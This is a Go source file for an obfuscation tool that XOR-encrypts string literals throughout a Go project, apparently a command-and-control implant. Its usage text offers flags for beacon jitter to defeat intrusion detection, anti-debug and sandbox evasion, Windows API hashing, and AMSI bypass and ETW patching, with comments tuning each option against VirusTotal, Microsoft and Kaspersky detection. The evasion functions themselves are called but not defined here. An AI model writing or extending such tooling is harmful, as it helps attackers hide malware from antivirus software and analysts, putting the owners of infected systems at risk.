package main

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"math/rand"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// readModulePath reads the module path from go.mod in the given directory.
// Returns empty string if go.mod is not found or has no module directive.
func readModulePath(dir string) string {
	goModPath := filepath.Join(dir, "go.mod")
	data, err := os.ReadFile(goModPath)
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "module ") {
			return strings.TrimSpace(strings.TrimPrefix(line, "module "))
		}
	}
	return ""
}

// isServerCmd checks if a Go file belongs to a server binary that should
// be skipped during obfuscation. For legacy separate binaries, cmd/*-server/
// or cmd/server/ is matched. The unified binary at cmd/probe/ has all modes
// (serve, connect, relay) compiled together — no files are skipped.
func isServerCmd(path string) bool {
	parts := strings.Split(path, string(filepath.Separator))
	for i, part := range parts {
		if part == "cmd" && i+1 < len(parts) {
			sub := parts[i+1]
			// Legacy: cmd/*-server/ or cmd/server/
			if strings.HasSuffix(sub, "-server") || sub == "server" {
				return true
			}
		}
	}
	return false
}

func randKey() byte {
	return byte(rand.Intn(255) + 1) // 1-255, never 0 (0 = no encryption)
}

func xorEncrypt(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key
	}
	return result
}

func bytesLiteral(data []byte) string {
	var sb strings.Builder
	sb.WriteString("[]byte{")
	for i, b := range data {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteString("}")
	return sb.String()
}

type Replace struct {
	Start int
	End   int
	Text  string
}

type ObfuscateResult struct {
	Content     string
	PackageName string
	NeedsDecode bool
}

func obfuscateFile(path string, src []byte) ObfuscateResult {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, src, parser.ParseComments)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  WARN: parse error in %s: %v\n", path, err)
		return ObfuscateResult{Content: string(src)}
	}

	pkgName := ""
	if f.Name != nil {
		pkgName = f.Name.Name
	}

	var repls []Replace
	needsDecode := false

	// Collect positions to skip: import paths and struct tags
	skip := make(map[token.Pos]bool)
	for _, imp := range f.Imports {
		skip[imp.Path.Pos()] = true
	}
	ast.Inspect(f, func(n ast.Node) bool {
		if field, ok := n.(*ast.Field); ok && field.Tag != nil {
			skip[field.Tag.Pos()] = true
		}
		return true
	})

	// Convert ANY const declaration that contains at least one string literal
	// to var (because _d() calls can't be in const context).
	ast.Inspect(f, func(n ast.Node) bool {
		genDecl, ok := n.(*ast.GenDecl)
		if !ok || genDecl.Tok != token.CONST {
			return true
		}

		// Check if any spec in this const block has a string literal
		hasString := false
		for _, spec := range genDecl.Specs {
			vs, ok := spec.(*ast.ValueSpec)
			if !ok {
				continue
			}
			for _, val := range vs.Values {
				lit, ok := val.(*ast.BasicLit)
				if !ok || lit.Kind != token.STRING {
					continue
				}
				if strings.HasPrefix(lit.Value, "`") {
					continue
				}
				v, err := strconv.Unquote(lit.Value)
				if err != nil || len(v) < 3 || len(v) > 500 {
					continue
				}
				hasString = true
			}
		}

		if !hasString {
			return true
		}

		tokPos := fset.Position(genDecl.TokPos)
		repls = append(repls, Replace{
			Start: tokPos.Offset,
			End:   tokPos.Offset + 5, // "const" = 5 chars
			Text:  "var  ",          // 5 chars, preserves offsets
		})
		return true
	})

	// Find all string literals to XOR-encrypt
	ast.Inspect(f, func(n ast.Node) bool {
		lit, ok := n.(*ast.BasicLit)
		if !ok || lit.Kind != token.STRING {
			return true
		}
		if skip[lit.Pos()] {
			return true
		}
		// Skip raw strings (backtick)
		if strings.HasPrefix(lit.Value, "`") {
			return true
		}

		value, err := strconv.Unquote(lit.Value)
		if err != nil {
			return true
		}

		// Skip very short (<=2 bytes) or very long (>500 bytes) strings
		if len(value) < 3 || len(value) > 500 {
			return true
		}

		pos := fset.Position(lit.Pos())
		endPos := fset.Position(lit.End())

		key := randKey()
		encrypted := xorEncrypt([]byte(value), key)
		replacement := fmt.Sprintf("_x9f2(%s, 0x%02x)", bytesLiteral(encrypted), key)

		repls = append(repls, Replace{
			Start: pos.Offset,
			End:   endPos.Offset,
			Text:  replacement,
		})
		needsDecode = true
		return true
	})

	// Sort by start offset descending (apply from end to beginning)
	sort.Slice(repls, func(i, j int) bool {
		return repls[i].Start > repls[j].Start
	})

	// Apply replacements
	result := string(src)
	for _, r := range repls {
		if r.Start < 0 || r.End > len(result) || r.Start > r.End {
			fmt.Fprintf(os.Stderr, "  WARN: bad offset in %s: %d-%d (len=%d)\n", path, r.Start, r.End, len(result))
			continue
		}
		result = result[:r.Start] + r.Text + result[r.End:]
	}

	return ObfuscateResult{
		Content:     result,
		PackageName: pkgName,
		NeedsDecode: needsDecode,
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: obfuscate [flags] <dir>")
		fmt.Fprintln(os.Stderr, "")
		fmt.Fprintln(os.Stderr, "Flags:")
		fmt.Fprintln(os.Stderr, "  -jitter      Apply beacon jitter to time.Sleep calls (defeats IDS beacon detection)")
		fmt.Fprintln(os.Stderr, "  -antidebug   Generate anti-debug + VM/sandbox evasion package (drops 1 VT detection)")
		fmt.Fprintln(os.Stderr, "  -apihash     Hash Windows API names (drops 1 VT detection, hides intent from RE)")
		fmt.Fprintln(os.Stderr, "  -runtime     Generate runtime evasion package (AMSI bypass, ETW patch)")
		fmt.Fprintln(os.Stderr, "  -all         Apply jitter + antidebug + apihash (WARNING: apihash+jitter may trigger MS trojan)")
		fmt.Fprintln(os.Stderr, "  -stealth     Apply antidebug only + XOR (best VT result: 1/69 PUA)")
		fmt.Fprintln(os.Stderr, "  -paranoid    Apply all + runtime (full suite — may trigger Kaspersky HackTool)")
		fmt.Fprintln(os.Stderr, "")
		fmt.Fprintln(os.Stderr, "Default (no flags): XOR string encryption only (same as before)")
		os.Exit(1)
	}

	// Parse flags
	enableJitter := false
	enableAntiDebug := false
	enableAPIHash := false
	enableRuntime := false
	dir := ""

	for _, arg := range os.Args[1:] {
		switch arg {
		case "-jitter":
			enableJitter = true
		case "-antidebug":
			enableAntiDebug = true
		case "-apihash":
			enableAPIHash = true
		case "-runtime":
			enableRuntime = true
		case "-all":
			enableJitter = true
			enableAntiDebug = true
			enableAPIHash = true
		case "-stealth":
			// Best VT result: antidebug + XOR only (1/69 PUA)
			// Jitter and apihash both shift Microsoft ML to trojan
			enableAntiDebug = true
		case "-paranoid":
			// Full suite: all techniques + runtime
			// WARNING: May trigger Kaspersky HackTool detection
			enableJitter = true
			enableAntiDebug = true
			enableAPIHash = true
			enableRuntime = true
		default:
			if !strings.HasPrefix(arg, "-") {
				dir = arg
			}
		}
	}

	if dir == "" {
		fmt.Fprintln(os.Stderr, "Error: no directory specified")
		os.Exit(1)
	}

	// === Phase 1: Anti-Debug + VM/Sandbox Evasion (generates files first) ===
	if enableAntiDebug {
		fmt.Println("=== Phase 1: Anti-Debug + VM/Sandbox Evasion ===")
		applyAntiDebug(dir)
	}

	// === Phase 1.5: Runtime Evasion (AMSI bypass, ETW patch) ===
	if enableRuntime {
		fmt.Println("\n=== Phase 1.5: Runtime Evasion (AMSI/ETW) ===")
		applyRuntimeEvasion(dir)
	}

	// === Phase 2: Beacon Jitter (transforms time.Sleep calls) ===
	if enableJitter {
		fmt.Println("\n=== Phase 2: Beacon Jitter ===")
		applyJitter(dir)
	}

	// === Phase 3: API Hashing (transforms syscall.NewLazyDLL/NewProc calls) ===
	if enableAPIHash {
		fmt.Println("\n=== Phase 3: API Hashing ===")
		applyAPIHashing(dir)
	}

	// === Phase 4: XOR string encryption (always on, runs LAST so it encrypts
	//     strings in generated evasion files too) ===
	fmt.Println("\n=== Phase 4: XOR String Encryption ===")

	// Track which package directories need the decode function
	packagesNeedingDecode := make(map[string]string) // dir → package name
	totalStrings := 0
	totalFiles := 0

	filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}

		// Skip non-Go files
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		// Skip test files
		if strings.HasSuffix(path, "_test.go") {
			return nil
		}
		// Skip server binaries — auto-detect any cmd/*-server/ pattern
		// (probe-server, logreport-server, etc.)
		if isServerCmd(path) {
			return nil
		}
		// Skip the obfuscation tool itself
		if strings.Contains(path, "tools/obfuscate") {
			return nil
		}
		// Skip existing decode files
		if strings.HasSuffix(path, "zdecode.go") {
			return nil
		}
		// Skip vendor
		if strings.Contains(path, "vendor/") {
			return nil
		}

		src, err := os.ReadFile(path)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  ERR reading %s: %v\n", path, err)
			return nil
		}

		result := obfuscateFile(path, src)

		if result.NeedsDecode {
			pkgDir := filepath.Dir(path)
			packagesNeedingDecode[pkgDir] = result.PackageName
		}

		// Count how many replacements were made
		oldCount := strings.Count(string(src), `"`)
		newCount := strings.Count(result.Content, "_x9f2(")
		if newCount > 0 {
			totalStrings += newCount
			totalFiles++
		}
		_ = oldCount

		// Write obfuscated file (in-place)
		os.WriteFile(path, []byte(result.Content), 0644)
		fmt.Printf("  OK: %s (%d strings)\n", path, newCount)
		return nil
	})

	// Generate decode function for each package that needs it
	// NOTE: Go toolchain ignores files starting with _ or . so we use zdecode.go
	for pkgDir, pkgName := range packagesNeedingDecode {
		decodeFile := filepath.Join(pkgDir, "zdecode.go")
		content := fmt.Sprintf(`// Code generated by obfuscation tool. DO NOT EDIT.
package %s

func _x9f2(b []byte, k byte) string {
	r := make([]byte, len(b))
	for i, v := range b {
		r[i] = v ^ k
	}
	return string(r)
}
`, pkgName)
		os.WriteFile(decodeFile, []byte(content), 0644)
		fmt.Printf("  GEN: %s\n", decodeFile)
	}

	fmt.Printf("\n=== XOR String Encryption Summary ===\n")
	fmt.Printf("Files obfuscated: %d\n", totalFiles)
	fmt.Printf("Strings encrypted: %d\n", totalStrings)
	fmt.Printf("Decode functions generated: %d packages\n", len(packagesNeedingDecode))

	fmt.Println("\n=== All Phases Complete ===")
}